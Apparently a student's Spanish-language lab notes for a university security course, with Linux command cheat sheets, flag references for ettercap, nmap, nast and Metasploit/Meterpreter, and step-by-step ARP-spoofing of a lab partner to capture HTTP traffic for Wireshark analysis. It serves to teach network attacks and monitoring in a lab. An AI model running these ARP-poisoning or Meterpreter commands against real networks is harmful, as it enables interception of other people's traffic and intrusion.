# PRÁCTICA 2 - Seguridad Informática

DEFENSA DE LA PRÁCTICA: 11 (en principio). Semana del 10 al 14 -> Apagan las máquinas el 7 de noviembre.

**Objetivo:** El objetivo de esta práctica es aprender y experimentar con la captura y el análisis del tráfico de red mediante sniffers, comprender y probar ataques DoS/DDoS, y trabajar la llamada «trilogía»: descubrimiento de hosts, escaneo de puertos y fingerprinting de sistemas (conjunto de técnicas usadas para identificar características de un equipo o servicio en la red). Además, se pretende gestionar y analizar la información de auditoría generada durante las pruebas, empleando en el laboratorio distintas herramientas sugeridas para practicar y validar los conceptos.

IMPORTANTE: ETTERCAP COMANDOS, FUNCIONAR OSSEC Y MEDUSA.

 1- Sniffers y análisis de tráfico: a, b, c, d.
 
 2- Ataques Man in the Middle: e, f. El apartado b también es un Man in The Middle.
 
 3-Detección y monitorización: g, i, j.
 
 4-Reconocimiento y escaneo de red: h, n, o
 
 5-Ataques y protección de servicios: k, l, p
 
 6-Sistemas de detección y respuesta: q, r 


En esta práctica se van a realizar muchos escaneos, ataques y defensas, por lo que se van a generar muchos logs en nuestro sistema. Tendremos que ir comprobando los logs poco a poco así como el espacio para que no se nos llene el disco ni ocurran cosas raras en nuestras máquinas.

**IMPORTANTE:** Mirar una vez al día cuánto espacio tiene nuestra máquina y cuando ocupa nuestro log de la máquina. Nos podemos encontrar hasta logs de 5 GB que no valen para nada.

## Repaso COMANDOS BÁSICOS útiles para la práctica

```bash
#Accesos
last               # Sesiones de usuarios accedidas a la máquina
date               # Hora sesión actual

# Navegación
pwd                 # Carpeta actual
ls                  # Listar
ls -l               # Listar con detalles
ls -a               # Incluir ocultos

cd /ruta            # Cambiar carpeta
cd ~                # Ir al home (~ es el directorio home del usuario actual)
cd ..               # Subir un nivel


# Archivos y directorios
touch archivo.txt   # Crear archivo vacío
mkdir carpeta       # Crear carpeta
mkdir -p a/b/c      # Crear subcarpetas
cp origen destino   # Copiar archivo
cp -r dir1 dir2     # Copiar directorio
mv origen destino   # Mover/renombrar
rm archivo.txt      # Borrar archivo
rm -r carpeta       # Borrar carpeta

# Ver contenido
cat archivo.txt     # Mostrar contenido
less archivo.txt    # Leer con paginador
head archivo.txt    # Primeras 10 líneas
tail archivo.txt    # Últimas 10 líneas
     tail -n archivo.log # Especificar las últimas N líneas
     tail -f archivo.log # Ver en tiempo real

# Búsqueda
find / -name "archivo.txt"  # Buscar archivo
grep                # Se utiliza para buscar y filtrar líneas de texto que coinciden con un patrón específico
    grep "texto" archivo.txt    # Buscar texto
    grep -r "texto" /ruta       # Buscar en varios archivos

# Redirección y tuberías (pipes)
> sobreescribe el archivo
>> añade al final del archivo

| tubería. Envía la salida de un comando como entrada de otro comando, conectando procesos en serie

# Permisos
ls -l               # Ver permisos
chmod 755 archivo   # Cambiar permisos
chown usr:grp arch  # Cambiar propietario

# Procesos
ps               # Procesos ligados a tu terminal actual
   -e            # Muestra todos los procesos del sistema 
   -a            # Procesos de todos los usuarios (excepto los sin terminal)
   -u            # Procesos con info del usuario, CPU, memoria, etc.
   -x            # Incluye procesos sin terminal (daemons, servicios)
ps aux           # Vista clásica estilo BSD, muestra todos los procesos con detalles
ps -ef           # Vista estilo Unix System V, alternativa a aux

top                 # Procesos en tiempo real
sudo systemd-cgtop  # Procesos en tiempo real de los grupos de control
watch               # Ejecuta un comando repetidamente
   -n <segundos>    # Intervalo de actualización (por defecto 2 segundos)
   -d               # Resalta los cambios en cada actualización
kill PID            # Terminar proceso

# Paquetes (Debian/Ubuntu)
sudo apt update           # Actualizar lista
sudo apt upgrade          # Actualiza los paquetes instalados a sus versiones nuevas, sin eliminar ni instalar paquetes adicionales
sudo apt full-upgrade     # Actualiza todo el sistema, incluso si para hacerlo debe instalar o eliminar paquetes
sudo apt install paquete  # Instalar
sudo apt remove paquete   # Eliminar
dpkg -l | wc -l           # Lista todos los paquetes instalados  y wc -l cuenta las líneas, es decir, el total de paquetes
        -dpkg -l → lista todos los paquetes.
        -grep '^ii' → filtra los que están instalados (ii)
        -wc -l → cuenta cuántos hay

#Limpieza
apt autoremove  # Limpia espacio quitando dependencias que ya no usa ningún paquete.
apt autoclean   # Borra archivos de instalación (.deb) viejos o inutilizables del caché de APT
apt purge nombre_paquete   # Desinstala y borra también archivos de configuración

# Red
ping 8.8.8.8         # Probar conexión
    -c:              # Especifica cuantos paquetes se van a mandar
ping6 2002:0a0b:3032::1 # Probar conexión IPv6
tracert ip           # Muestra el camino a seguir para alcanzar una IP

 **IP moderno**
ip a                         # Ver IP
ip addr show                 # Igual que ip a
ip addr add <IP>/<mask> dev <interfaz>   # Añadir dirección IP temporal
ip addr del <IP>/<mask> dev <interfaz>   # Quitar dirección IP
ip link show                 # Mostrar estado de interfaces
ip link set <interfaz> up    # Activar interfaz
ip link set <interfaz> down  # Desactivar interfaz
ip route show                # Mostrar tabla de rutas
ip route add <red> via <gateway> dev <interfaz>  # Añadir ruta
ip route del <red>           # Eliminar ruta

**ifconfig (antiguo)**
ifconfig                     # Mostrar interfaces activas
ifconfig <interfaz>          # Mostrar detalles de interfaz
ifconfig <interfaz> up       # Activar interfaz
ifconfig <interfaz> down     # Desactivar interfaz
ifconfig <interfaz> <IP> netmask <mask>  # Asignar IP temporal
ifconfig <interfaz>:<n> <IP> netmask <mask>  # Crear alias/interfaz lógica

**route (rutas)**
route -n                     # Mostrar tabla de rutas
route add default gw <gateway>        # Añadir puerta de enlace predeterminada
route del default gw <gateway>        # Eliminar puerta de enlace predeterminada
route add -net <red> gw <gateway>    # Añadir ruta específica
route del -net <red> gw <gateway>    # Eliminar ruta específica

**sockets**
1-Alternativa nueva
ss           # Muestra todos los sockets
   -t        # TCP
   -u        # UDP
   -l        # Solo sockets escuchando (listening)
   -n        # Mostrar IPs y puertos en números (no nombres)
   -p        # Mostrar PID y proceso que usa el socket
   -a        # Mostrar todos los sockets (escuchando y conectados)
   -s        # Resumen de conexiones por tipo

2-Alternativa clásica (más lento que ss, pero muy usada)
netstat
   -t        # TCP
   -u        # UDP
   -l        # Solo escuchando
   -n        # Números en lugar de nombres
   -p        # PID/Nombre del proceso
   -a        # Todas las conexiones y puertos escuchando
   -r        # Tabla de rutas
   -s        # Estadísticas de protocolos
   -i        # Interfaces de red
   -o        # Muestra información adicional relacionada con los temporizadores de las conexiones TCP

 
wget <url>                    # Descarga el contenido en un archivo con el mismo nombre que en el servidor
wget -o | -O <url>                 
		-o (o minúscula) → guarda el registro (mensajes) en un archivo.
		-O (O mayúscula) → guarda el archivo descargado con ese nombre.
wget --spider https://www.google.com  # Comprueba si la URL está disponible sin descargar nada
wget --timeout=10 https://www.google.com  # Límite de espera antes de rendirse
wget --server-response --spider <url>  # Hace la petición y muestra únicamente los headers HTTP, sin guardar nada
wget -q <url>                 # Descarga sin mostrar barras ni mensajes, solo errores.


curl <url>                   # Probar conexión HTTP/HTTPS y obtener contenido
curl -I <url>                # Solo encabezados HTTP
curl -s <url>                # Silencioso, sin mostrar progreso
curl -O <url>                # Descargar archivo
curl -L <url>                # Seguir redirecciones


# Usuarios
whoami               # Usuario actual
id                   # UID y grupos
adduser usuario      # Crear usuario
passwd usuario       # Cambiar contraseña

# Sistema
uname -r             # Versión kernel
lsb_release -a       # Versión distro
df -h                # Espacio en disco
du -sh carpeta       # Tamaño carpeta
free -h              # Memoria RAM
systemctl            # Gestiona el estado de los servicios del sistema
   - list-units → “lista las unidades que están activas ahora”
   - list-unit-files → “lista todas las unidades que existen y su configuración de inicio”
          ---type = service | target | socket | mount | device | timer | path | slice | automount | swap
          --state = active | inactive | enabled | disabled | masked | static
   - status <unidad> → “muestra el estado detallado de una unidad o servicio específico”
   - start <unidad> → “inicia un servicio/unidad”
   - stop <unidad> → “detiene un servicio/unidad”
   - restart <unidad> → “reinicia un servicio/unidad”
   - enable <unidad> → “configura la unidad para que arranque automáticamente”
   - disable <unidad> → “desactiva el arranque automático de la unidad”
   - get-default → “muestra el target por defecto del sistema”
   - set-default <target> → “cambia el target por defecto del sistema (permanente)”
   - isolate <target> → “cambia al target especificado inmediatamente (temporal)”
   - daemon-reload  →  e dice a systemd que recargue todas las unidades y servicios

	# Logs
Dos formas de ver los logs:
1-De forma centralizada: journald -> journalctl
journalctl           # Muestra los registros (logs) de los servicios y del sistema
     -b → “muestra los logs desde el último arranque”
     -a → “muestra todas las líneas completas, incluso las truncadas por pantalla”
     -p err → Muestra solo los mensajes de error (y más graves) del sistema
     -p warning → muestra solo mensajes de nivel warning y más graves (error, crítico, alerta)
     -x → Explica los mensajes del log con información extra si está disponible.
     -e → Va directamente al final de los logs (útil para ver los últimos errores)
     -u <unidad> → “filtra los logs de una unidad o servicio específico”
     -f  → “muestra los logs en tiempo real (como tail -f)”
     --since "YYYY-MM-DD HH:MM:SS" → “muestra logs desde una fecha/hora específica”
     --until "YYYY-MM-DD HH:MM:SS" → “muestra logs hasta una fecha/hora específica”

2-Accediendo a las carpetas de /var/log y viendo los logs que de cada tipo:
/var/log/syslog: mensajes generales del sistema
/var/log/auth.log:  autenticación, sudo, logins
/var/log/dpkg.log → instalación de paquetes
...

uptime               # Tiempo encendido
reboot               # Reiniciar
shutdown now         # Apagar

# Flag de ayuda para ver comandos grandes de golpe
--no-pager           # No hay paginación



## PRÁCTICA 2

# Transferencia de archivos
scp lsi@ip:/archivo_origen directorio_destinoLocal

# Ver donde están los ficheros .pcap
sudo find / -type f \( -iname "*.pcap" -o -iname "*.pcapng" -o -iname "*.cap" -o -iname "*.pcap.gz" -o -iname "*.pcapng.gz" \) -print 2>/dev/null


1- ETTERCAP — CHULETA DE FLAGS (TODO EN UN SOLO BLOQUE, TEXTO PLANO)

# Modos / interfaz
-T                        modo texto (CLI). Veremos toda la info de la red. Dentro de esta nos pedirá elegir:

	h → help. Ver ayuda completa de comandos disponibles

    s → statistics. Ver estadísticas de tráfico capturado

    l → list. Listar todos los hosts descubiertos (los 230)

    c → connections. Ver la lista de conexiones 

    q → Salir del programa

-C (NO USAR)                       modo curses (menús en terminal; más estructurado que -T).
-G (NO USAR)                       modo gráfico (GTK) — NO usar en servidores sin X.

# Ayuda / info
-h, --help                muestra ayuda.
-v, --version             muestra versión.
-q                        quiet: reduce verbosidad (menos salida en pantalla).

# Interfaz / captura
-i <iface>                usar interfaz (ej: eth0, wlan0).
-p, --nopromisc           no poner la interfaz en modo promiscuo.
-w <archivo.pcap>         guardar captura en archivo pcap.
-r <archivo.pcap>         leer tráfico desde un pcap (modo offline).
--autosave                (según versión) guardar automáticamente pcap.

# MitM / métodos de ataque
-M <METHOD:ARGS>          lanzar ataque man-in-the-middle.
                          Ejemplos:
                            -M arp:remote /IP1/ /IP2/   # engaña a IP1 y IP2 para que todo su tráfico pase por tu máquina (ARP poisoning entre dos hosts).
                            -M arp:gateway /IP_victima/ # hace creer a la víctima que tú eres el gateway (redirige su tráfico al gateway a través tuyo).
                            -M syn /IP1/ /IP2/          # usa método SYN (según versión, puede usarse para ciertos ataques/mitm).

-o                        only-mitm: solo hacer poisoning (no procesar/sniffear paquetes).
-B <iface1> <iface2>      modo bridge (inline) entre dos interfaces (filtrado inline).


# Filtros / modificaciones
-F <filtro_compilado>     cargar filtro compilado (output de etterfilter).
etterfilter input.ef -o out.ef   # compilar filtro antes de usarlo.
                          filtros permiten reemplazar cadenas, inyectar respuestas, bloquear, etc.

# Plugins
-P <plugin>               cargar plugin (ej: dns_spoof, chk_poison, autoadd, remote_browser).
                          algunos plugins requieren ficheros/config previos (hosts, reglas).

# Opciones de comportamiento
-u, --unoffensive         no reenviar paquetes (modo no destructivo).
-S                        modo sniffer (según versión) / minimizar acciones intrusivas.
--local-mac <MAC>         usar MAC local especificada (cuando aplicable).
--remote-mac <MAC>        especificar MAC remota (cuando aplicable).

# Logging / output
--log <file>              (según versión) guardar logs en archivo.
--debug                   modo debug (muy verboso).
--pcap                   (sin -w) opciones relacionadas con pcap (varía por versión).

# Ejecución / automatización
-q                        quiet, útil para scripts.
-n                        (según versión) no resolver nombres DNS/hosts (más rápido).
--no-spoof-check          evitar comprobaciones de spoofing (según versión).

# Señales / parada
(en lugar de Ctrl+C) usar pkill -TERM ettercap o sudo kill <PID> para parada limpia.




2- NMAP: Sirve para escanear redes y descubrir hosts, puertos y servicios.

# Puertos
-p : Define puertos específicos a escanear.  
- p : Escanea todos los puertos posibles (0-65535).  

# Escaneo de hosts
-sP : Detecta hosts activos en una red sin escanear puertos.
-sL: NO escanea puertos, ni hace ping a los equipos, solo lista las IPs/hosts que serían escaneadas-
- Pn : No realiza ping previo; asume que el host está activo.  

# Velocidad y control
-T0 a T5: Controla velocidad del escaneo (T0 muy lento y sigiloso, T5 muy rápido).  

# Detección de servicios y sistema operativo
- A: Escaneo completo (OS, servicios, versiones, scripts y traceroute).  
-O: Detecta el sistema operativo del host.  
-sV: Detecta servicios y sus versiones.  

# Tipos de escaneo
-sS: SYN scan (semi-abierto, rápido y menos detectable).  
-sT: TCP connect scan (completo, más detectable).  
-sU: Escaneo de puertos UDP.  

# Verbosidad y depuración
- `-v` : Modo verbose, muestra información detallada.  
- `-vv` : Verbose máximo.  
- `-d` : Modo debug para ver paquetes y procesos internos.  

# Filtrado y resultados
- `--open` : Muestra solo puertos abiertos.  
- `--reason` : Explica por qué un puerto está abierto, cerrado o filtrado.  

# Scripts NSE
- --script: Ejecuta scripts NSE para detección avanzada y auditorías.  
- --script=<script>: Ejecuta un script específico.  
- --script-args: Pasa argumentos a los scripts NSE.  
- --script-help: Muestra ayuda sobre los scripts disponibles.  

# Otras opciones útiles
- --traceroute: Realiza un traceroute hacia el host.  
- 6: Habilita escaneo IPv6.  
-N : No resuelve nombres DNS, usa solo IPs.  
- `-R` : Fuerza resolución DNS.  
- --max-retries: Número máximo de reintentos por host.  
- --host-timeout : Tiempo máximo permitido por host.  
- --max-rate : Limita la velocidad máxima de paquetes por segundo.  
- --min-rate : Define velocidad mínima de paquetes.  

# Salida de resultados
-oN : Guarda salida en formato normal.  
-oX : Guarda salida en formato XML.  
- o : Guarda salida en formato grepable.  
- oA : Guarda salida en todos los formatos anteriores.  
- --packet-trace : Muestra todos los paquetes enviados y recibidos.  
- --iflist : Lista interfaces de red disponibles y rutas.  
- --version-all : Detección de versión exhaustiva.  
- --version-light : Detección de versión rápida.  



3- NAST: Sirve para analizar y monitorizar redes locales.
-m	Muestra los equipos del segmento (IP + MAC)	
-i	Especifica la interfaz de red a usar	
-s	Activa modo sniffer (captura de tráfico)	
-p	Escanea puertos abiertos en un host	
-S	Detecta sniffers en la red (equipos escuchando tráfico)	
-g	Muestra información general de la red (gateway, máscara, etc.)	
-a	Analiza ARP (tabla de direcciones IP ↔ MAC)




4-METASPLOIT:
# Inicio
msfconsole        # Arranque de metasploit
mfsupdate         # Actualizar metasploit


# Búsquedas e información
search nombre
search type:exploit apache
search cve:2021
info

# Uso de exploits
use exploit/ruta/del/exploit

# Payloads
show payloads                      # Listar payloads
set PAYLOAD nombre_del_payload     # Seleccionar payload
run                                # Ejecutar payload


# Meterpreter
sysinfo          # Información del sistema comprometido
getuid           # Ver qué usuario eres
ps               # Listar procesos en ejecución
pwd              # Ver directorio actual
ls               # Listar archivos
cd /ruta         # Cambiar directorio
cat archivo.txt  # Ver contenido de archivo
search -f *.txt  # Buscar archivos por patrón
upload /ruta/local/file.txt   # Subir archivo a la víctima
download file.txt /ruta/local # Descargar archivo de la víctima
shell            # Acceder a la terminal normal de la víctima



5-Iftop (ver ancho de banda del tráfico por IP)
-i	# Elegir interfaz (-i ens33)
-P	# Mostrar puertos
-B	# Mostrar en bytes (no bits)
-t	# Modo texto (sin interfaz gráfica)
-n	# No resolver nombres (solo IPs)


6-Nethogs ((ver ancho de banda del tráfico por procesos)
<interfaz>	# Indicar interfaz (nethogs ens33)
-d X	    # Actualización cada X segundos (-d 1)
-t	        # Modo texto/log para scripts
-p	        # Mostrar solo procesos (más limpio)

```



<br>
<br>

## 1-SNIFFERS Y ANÁLISIS DE TRÁFICO

Sniffers (o analizadores de paquetes) son herramientas o programas software diseñados para capturar, monitorizar y analizar el tráfico de red que circula por un segmento de red. Su funcionamiento se basa en poner la tarjeta de red (NIC) en modo promiscuo, lo que le permite capturar todos los paquetes que pasan por la red, no solo los dirigidos específicamente a esa máquina.

### **Apartado a) Instale el ettercap y pruebe sus opciones básicas en línea de comando.**

**ARP SPOOFING**: Ettercap es una herramienta usada para hacer análisis y manipulación del tráfico de red, especialmente en redes LAN.
Se utiliza mucho en auditorías de seguridad para ver cómo viajan los datos y detectar posibles ataques o vulnerabilidades.

¡¡SOLO ANALIZAREMOS TRÁFICO IPv4!!

Vamos a instalar ettercap en nuestra máquina sin interfaz gráfica. Para eso:

```bash
apt install ettercap-text-only
```

Al instalarlo con text-only no dejará entrar al modo interactivo. Esto quiere decir que cada vez que queramos hacer algo con ettercap solo podemos teclear sus comandos desde la línea de comandos. El modo interactivo es como una especie de shell dentro de nuestra línea de comandos, pero eso nosotros no lo hemos activado.


Llamamos a eterrcap por la línea de comandos. Ettercap tiene los siguientes parámetros principales:

- -T: modo solo texto. Muestra el tráfico de red en tiempo real. Muestra demasiada información, cientos de líneas por segundo. Subflags para -T:

- -q: Silencioso (menos output). Muestra solo LO IMPORTANTE ya que omite paquetes técnicos como ACK,SYN etc.

- -i: especificarle la interfaz. 

- -L: para escribir en un fichero con extension .ettrcap                                                                                                 
- -w: para escribir en un fichero con extension .pcap      

- -P <pluging> -> especificar que plugin usar
- -p -> permite capturar todos los paquetes que pasan a través de la red
                                                             
- -r: para leer un fichero con extensión .pcap

- -t: filtrar por protocolo (http, tcp...)
 
- -M <metodos:argumentos> -> hace un ataque MITM(man in the middle). Subflags para -M:                                                                                                                                                 
    - arp:remote / arp:gateway -> para hacer un arp poisoning(ARP spoofing)                                          
	- icmp:MAC/IP -> ataque de redireccionamento icmp                                                          
    - DHCP:ip_pool/netmask/dns -> para un dhcp spoofing                                                         
    - port:remote/tree -> robo de puertos     

Para hacer ataques MiM, ettercap tiene **dos targets**. Esto significa que Ettercap necesita dos equipos entre los que va a ponerse en medio para espiar o alterar el tráfico.

- Target 1 (T1) = primer equipo (por ejemplo: la víctima, un PC).
	
- Target 2 (T2) = segundo equipo (por ejemplo: el router/gateway o otro PC).


No usar ettercap con target ///  -> no hacer esto porque colapsa porque se está leyendo toda la red.


¡IMPORTANTE!: a veces cerrar un comando con Ctrl+C de ettercap puede dar problemas. Para cerrar bien:

```bash
sudo pkill -TERM ettercap
# o si prefieres por PID:
sudo pgrep -a ettercap      # ver PID
sudo kill -TERM <PID>
```


<br>

---
### **Apartado b) Capture paquetería variada de su compañero de prácticas que incluya varias sesiones HTTP. Sobre esta paquetería (puede utilizar el wireshark para los siguientes subapartados)**

- **Identifique los campos de cabecera de un paquete TCP**  
- **Filtre la captura para obtener el tráfico HTTP**  
- **Obtenga los distintos “objetos” del tráfico HTTP (imágenes, pdfs, etc.)**  
- **Visualice la paquetería TCP de una determinada sesión.**  
- **Sobre el total de la paquetería obtenga estadísticas del tráfico por protocolo como fuente de información para un análisis básico del tráfico.**  
- **Obtenga información del tráfico de las distintas “conversaciones” mantenidas.**  
- **Obtenga direcciones finales del tráfico de los distintos protocolos como mecanismo para determinar qué circula por nuestras redes.**

 
!! Solo usaremos HTTP porque no va cifrado !!

Instalar **wireshark** en local y ver el tráfico del compañero -> tendremos que ver el gato que nuestro compañero descarga con curl. Cuidado con los balanceadores!! Buscar fotos que sean solo en http (https no que va cifrado).

Una vez instalado wireshark tenemos que instalar en la máquina **tcpdump** para poder ver el tráfico de la máquina en wireshark.


**PASOS ATAQUE-DEFENSA**

1- El atacante hace sniffing al trafico del compañero:
```bash
ettercap -T -q -i ens33 -M arp:remote //10.11.48.175/ //10.11.48.1/ (sniffing da paqueteria)
```

Mientras esfina, en otro terminal:
```bash
tcpdump -i ens33 -s 65536 -w /home/lsi/lsicompa.pcap
```

   [-i] es para especificar la interfaz.
   [-s] el límite de bytes de los paquetes a capturar.
   [-w] el achivo donde se guardará.


<br>

2-Mientras el atacante hace el sniffing y guarda la paqueteria (tcpdump), la víctima busca imágenes, páginas, archivos en http (https no sirve ya que la info está cifrada):

 2.1- Archivo lsicompa:
```bash
   curl http://w3af.org/                                                                            #página W3AF
   curl http://www.edu4java.com/_img/web/http.png                                                   #foto de un servidor
   curl 
```


2.1-Archivo lsicompa2:
```bash
curl http://securitylab.disi.unitn.it/lib/exe/fetch.php?media=teaching:netsec:2016:g4_-_mitm.pdf
curl http://cdn2.thecatapi.com/images/MTY3ODIyMQ.jpg
curl http://owasp.org/
```

El atacante tiene que poder ver más adelante:
- pdf 
- foto
- web 

<br>

3- El atacante sale de ettercap con q (si salimos con ctrl+c tiramos con la conexion del compañero), hace ctrl+c en el terminal donde está el tcpdump y enviamos el archivo a nuestra máquina local:

  1º forma -> si tenemos Windows y nos conectamos por ssh con mobaXTerm o Bitvise SSH con arrastrar o archivo a nuestro ordenador ya está.

  2º forma -> si no tenemos acceso a nuestro árbol de directorios de la máquina de lsi o temos Linux ejecutamos -> scp lsi@ip rutaArchivomáquina destinoLocal

  ```bash
 scp lsi@10.11.48.202:/home/lsi/lsicompa.pcap "C:\Users\User\Desktop\INGENIERIA_INFORMATICA\4_curso\1_CUATRI\LSI\P2\"
```

```bash
 scp lsi@10.11.48.202:/home/lsi/lsicompa2.pcap "C:\Users\User\Desktop\INGENIERIA_INFORMATICA\4_curso\1_CUATRI\LSI\P2\"
```

- lsicompa- http con página web e imagen de servidor
- lsicompa2- http con páginas web, imágenes y pdfs.

<br>

4- Abrimos Wireshark:

Arriba en archivos le damos a abrir y seleccionamos el archivo .pcap y veríamos toda la paqueteria que se capturo con el ettercap.


- **Identifique los campos de cabecera de un paquete TCP**

En la lista da paquetería buscamos un paquete TCP, pinchamos en uno y abajo nos pone las siguientes lineas:

    Frame 59: 165 bytes on wire (1320 bits), 165 bytes captured (1320 bits)
    Ethernet II, Src: VMware_97:24:d0 (00:50:56:97:24:d0), Dst: VMware_97:d5:d9 (00:50:56:97:d5:d9)
	Internet Protocol Version 4, Src: 10.30.12.20, Dst: 10.11.48.202
    Transmission Control Protocol, Src Port: 63928, Dst Port: 22, Seq: 1, Ack: 165, Len: 0

Pulsamos sobre la flecha desplegable a la izquierda de “Transmission Control Protocol".

<img width="1005" height="513" alt="imagen" src="https://github.com/user-attachments/assets/e84d50c7-72c1-461a-8bcd-05d2d267ee17" />

<br>

- **Filtre la captura para obtener el tráfico http**

En la barra de filtros ponemos http:
<img width="1595" height="171" alt="imagen" src="https://github.com/user-attachments/assets/c8dcc23d-43ba-4ca0-a84a-d3c3a04c2029" />


- **Obtenga los distintos “objetos” del tráfico HTTP (imágenes, pdfs, etc.)**

1-IMÁGENES

Una vez que filtramos por http, pinchamos en una petición y miramos la estructura que tiene.

Para ver la imagen, accedemos al http que indica que tiene una imagen y vamos a su estructura.

Abajo del todo nos aparece en enlace:
<img width="1563" height="678" alt="imagen" src="https://github.com/user-attachments/assets/75469ca8-0c97-4cbd-a408-6c3d7cc36bf8" />


Esto no!!: Clic derecho en el enlace -> Copiar -> Valor -> Pegamos la URL en internet y podemos visualizar la imagen.

**CARLOS PIDE ESTO**: Seleccionamos un paquete HTTP y vamos File > Export Objects > HTTP y le damos a preview para visualizar el archivo de la petición, o a save si queremos guardarnoslo.

<br>

-PDFS:

Hacemos lo mismo que con las imágenes.


<br>

- **Visualice la paquetería TCP de una determinada sesión.**

Vamos a 'Analizar' > 'Seguir' > Secuencia tcp (tcp stream)

<img width="992" height="767" alt="imagen" src="https://github.com/user-attachments/assets/e0f415a6-22ae-4af1-bfbc-e03243363065" />


<br>

- **Sobre el total de la paquetería obtenga estadísticas del tráfico por protocolo como fuente de información para un análisis básico del tráfico.**  

Vamos a 'Estadísticas' > Jerarquia de protocolo

<img width="1156" height="207" alt="imagen" src="https://github.com/user-attachments/assets/a6cf9129-3275-4f13-84ae-7f509eb17b63" />


<br>

- **Obtenga información del tráfico de las distintas “conversaciones” mantenidas.**

Vamos a 'Estadísticas' > Conversaciones

<img width="938" height="401" alt="imagen" src="https://github.com/user-attachments/assets/faa5b18d-2074-4e5d-8708-4c6ff18bdacc" />


<br>

- **Obtenga direcciones finales del tráfico de los distintos protocolos como mecanismo para determinar qué circula por nuestras redes.**

Vamos a 'Estadísticas' > Puntos finales

<img width="922" height="392" alt="imagen" src="https://github.com/user-attachments/assets/b75dda09-290d-47a2-ac98-29c694ac7c1f" />


<br>
<br>

---

### **Apartado c) Obtenga la relación de las direcciones MAC de los equipos de su segmento.**

Para hacer esto tenemos que instalar **nmap**. ¡¡Hacer solo sobre IPv4, no hacer nada con IPv6!!

Instalamos nmap y nast:
```bash
apt install nmap
apt installl nast
```


1. Con nmap:
```bash
nmap -sP 10.11.48.0/23
```

- -sP : Detecta hosts activos en una red sin escanear puertos.  

Ejemplo de salida:
```bash
root@ismael:~# nmap -sP 10.11.48.0/23
Starting Nmap 7.93 ( https://nmap.org ) at 2025-10-28 10:59 CET
Nmap scan report for 10.11.48.1
Host is up (0.0014s latency).
MAC Address: DC:08:56:10:84:B9 (Alcatel-Lucent Enterprise)
Nmap scan report for 10.11.48.16
Host is up (0.0020s latency).
MAC Address: 00:50:56:97:77:98 (VMware)
Nmap scan report for 10.11.48.18
Host is up (0.0047s latency).
MAC Address: 00:50:56:97:E8:37 (VMware)
Nmap scan report for 10.11.48.19
Host is up (0.0015s latency).
MAC Address: 00:50:56:97:83:57 (VMware)
Nmap scan report for 10.11.48.20
Host is up (0.0075s latency).
MAC Address: 00:50:56:97:36:AF (VMware)
Nmap scan report for 10.11.48.21
Host is up (0.0014s latency).
MAC Address: 00:50:56:97:2D:B4 (VMware)
Nmap scan report for 10.11.48.23
```

2. Con nast:
```bash
nast -m -i ens33
```

Ejemplo de salida:
```bash
MAC address             Ip address (hostname)
===========================================================
00:50:56:97:29:8F       10.11.48.202 (ismael) (*)
DC:08:56:10:84:B9       10.11.48.1 (_gateway)
00:50:56:97:77:98       10.11.48.16 (10.11.48.16)
00:50:56:97:E8:37       10.11.48.18 (10.11.48.18)
00:50:56:97:83:57       10.11.48.19 (10.11.48.19)
00:50:56:97:36:AF       10.11.48.20 (10.11.48.20)
00:50:56:97:2D:B4       10.11.48.21 (10.11.48.21)
00:50:56:97:55:E1       10.11.48.23 (10.11.48.23)
00:50:56:97:A8:AB       10.11.48.25 (10.11.48.25)
00:50:56:97:DC:BD       10.11.48.26 (10.11.48.26)
00:50:56:97:88:90       10.11.48.27 (10.11.48.27)
00:50:56:97:4D:B5       10.11.48.28 (10.11.48.28)
00:50:56:97:F6:4C       10.11.48.29 (10.11.48.29)
00:50:56:97:9F:25       10.11.48.30 (10.11.48.30)
```


Saca la lista de MACs ordenadas de nuestra red.
   
<br>
<br>

---

### **Apartado d) Obtenga el tráfico de entrada y salida legítimo de su interface de red ens33 e investigue los servicios, conexiones y protocolos involucrados.**

Cuidado con localhost, que es virtual!!!


- TCPDUMP:
	
   1. Instalamos tcpdump: Comando apt install tcpdump (ya lo tenemos instalado de antes).
   
   2. Comando:
	
```bash
tcpdump -i ens33 -w /home/lsi/traficored.pcap
```
   Escuchamos el tráfico de la red. Lo dejamos un ratito para que recoja datos.

Vamos a hacer lo mismo sin escuchar en localhost:
```bash
tcpdump -i ens33 'not (net 127.0.0.0/8)' -w /home/lsi/traficored2.pcap
```

   3. Una vez con el fichero .pcap, los metemos en Wireshark y vemos el tráfico.
      
```bash
scp lsi@10.11.48.202:/home/lsi/traficored.pcap "C:\Users\User\Desktop\INGENIERIA_INFORMATICA\4_curso\1_CUATRI\LSI\P2\"
scp lsi@10.11.48.202:/home/lsi/traficored2.pcap "C:\Users\User\Desktop\INGENIERIA_INFORMATICA\4_curso\1_CUATRI\LSI\P2\"
```


**SERVICIOS, CONEXIONES Y PROTOCOLOS INVOLUCRADOS**

- Servicios:

Aplicaciones o funciones de red que usan un puerto concreto (por ejemplo, web, DNS, SSH). Cada servicio usa un protocolo asociado (HTTP, DNS, SSH, etc.).

Filtro general:

tcp || udp

Mira la columna Protocol → verás cosas como HTTP, TLSv1.2, DNS, SSH, DHCP. También puedes mirar la columna Info, que indica el tipo de tráfico o puerto.

<br>

- Conexiones
Comunicación entre dos direcciones IP y puertos (cliente ↔ servidor).

Wireshark → menú Statistics → Conversations → IPv4 o TCP

Ahí vemos:

  - IP origen / destino

  - Puerto origen / destino

  - Nº de paquetes y bytes intercambiados

<br>

- Protocolos:

Reglas o formatos que permiten que los equipos se comuniquen (capas del modelo TCP/IP).
Ejemplo: ARP, IP, TCP, UDP, HTTP, DNS...

En Wireshark → menú Estadísticas → Jerarquía de Protocolos
Te mostrará una lista con todos los protocolos detectados y su porcentaje de tráfico.

| Tipo          | Qué es                                        | Cómo verlo en Wireshark           | Ejemplo                                |
| ------------- | --------------------------------------------- | --------------------------------- | -------------------------------------- |
| **Servicio**  | Aplicación o función de red que usa un puerto | Columna *Protocol* o *Info*       | HTTP, DNS, SSH                         |
| **Conexión**  | Comunicación IP↔IP con puertos                | *Statistics → Conversations*      | 10.11.48.202:52314 ↔ 172.217.17.68:443 |
| **Protocolo** | Conjunto de reglas de comunicación            | *Statistics → Protocol Hierarchy* | TCP, UDP, ICMP, ARP                    |


<br>
<br>

---


## 2-ATAQUES MAN IN THE MIDDLE

### **Apartado e) Mediante arpspoofing entre una máquina objetivo (víctima) y el router del laboratorio obtenga todas las URL HTTP visitadas por la víctima.**

Yo ataco y en mi pantalla veo lo que mi compañero ve en directo. Sus cambios como yo estoy en el medio, yo lo muestro en pantalla. Lo tenemos que ver simultaneamente. Tengo que ver como cambia mi pantalla mientras el hace cambios (no se ve la pantalla remota).

